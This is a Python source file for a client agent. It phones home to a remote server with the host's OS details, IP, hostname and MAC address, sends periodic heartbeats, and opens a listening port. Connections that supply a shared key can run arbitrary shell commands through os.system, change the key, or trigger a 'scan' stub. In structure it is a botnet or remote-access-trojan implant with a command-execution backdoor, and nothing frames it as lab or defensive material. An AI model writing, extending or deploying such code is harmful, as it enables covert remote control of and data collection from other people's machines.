import socket, threading, time, json, re, uuid, os

class ClientSocket():
    def __init__(self, host, port, listen_port, auth_key):
        self.host = host
        self.port = port
        self.listen_port = listen_port
        self.auth_key = auth_key
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.host, self.port))
        self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen_socket.bind(('0.0.0.0', self.listen_port))
        self.listen_socket.listen(5)
        self.start_listening()

        ClientServerData = {
            "OperatingSystem": os.name,
            "SystemVersion": os.sys.version,
            "SystemPlatform": os.sys.platform,
            "SystemPath": os.sys.path,
            "IP": socket.gethostbyname(socket.gethostname()),
            "Hostname": socket.gethostname(),
            "ListenPort": self.listen_port,
            "AuthKey": self.auth_key,
            "MacAddress": ':'.join(re.findall('..', '%012x' % uuid.getnode())),
        }

        jsonClientServerData = json.dumps(ClientServerData)
        self.sendData(jsonClientServerData)
        self.imAliveService()
        self.receiveDataService()

    def sendData(self, data):
        self.s.send(data.encode('utf-8'))

    def closeSocketConnection(self):
        self.s.close()
        self.listen_socket.close()

    def imAliveService(self):
        threading.Thread(target=self.sendDataPeriodically, args=("Heartbeat_", 1)).start()

    def sendDataPeriodically(self, data, interval):
        heartbeat = 0
        while True:
            self.sendData(data + str(heartbeat))
            time.sleep(interval)
            heartbeat += 1

    def receiveData(self):
        while True:
            data = self.s.recv(1024)
            print(f"Received from server: {data.decode('utf-8')}")

    def receiveDataService(self):
        threading.Thread(target=self.receiveData).start()

    def start_listening(self):
        threading.Thread(target=self.listen_for_incoming_connections).start()

    def listen_for_incoming_connections(self):
        print(f"Listening for incoming connections on port {self.listen_port}")
        while True:
            client_socket, addr = self.listen_socket.accept()
            print(f"Accepted connection from {addr}")
            threading.Thread(target=self.handle_incoming_connection, args=(client_socket,)).start()

    def handle_incoming_connection(self, client_socket):
        try:
            client_socket.sendall("AuthKey?".encode('utf-8'))
            received_key = client_socket.recv(1024).decode('utf-8') 
            if received_key == self.auth_key:
                client_socket.sendall("Authorized".encode('utf-8'))
                while True:
                    data = client_socket.recv(1024)
                    if not data:
                        break
                    data = data.decode('utf-8')
                    data = json.loads(data)
                    if data["type"] == "command":
                        client_socket.sendall("Command received, command is now will be execute.".encode('utf-8'))
                        os.system(data["command"])
                    elif data["type"] == "stop":
                        client_socket.sendall("Stopping the client.".encode('utf-8'))
                        client_socket.close()
                        self.closeSocketConnection()
                        break
                    elif data["type"] == "status":
                        client_socket.sendall("I'm alive.".encode('utf-8'))
                    elif data["type"] == "scan":
                        client_socket.sendall("Scanning the network.".encode('utf-8'))
                    elif data["authUpdate"]:
                        self.auth_key = data["authKey"]
                        client_socket.sendall("AuthKey updated.")
            else:
                client_socket.sendall("Unauthorized".encode('utf-8'))
                client_socket.close()
        except Exception as e:
            print(f"Error handling connection: {e}")
        finally:
            client_socket.close()